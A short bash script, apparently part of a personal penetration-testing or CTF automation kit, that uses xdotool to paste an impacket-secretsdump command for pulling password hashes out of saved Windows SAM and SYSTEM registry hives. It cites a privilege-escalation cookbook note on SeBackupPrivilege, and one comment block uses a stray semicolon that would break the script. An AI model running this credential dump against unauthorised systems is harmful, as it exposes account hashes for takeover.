#!/bin/bash

: '
Registry: Save SYSTEM, SECURITY, and SAM hives.
'

; '
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "impacket-secretsdump -sam sam.save -system system.save LOCAL"
xdotool key Return
sleep 1
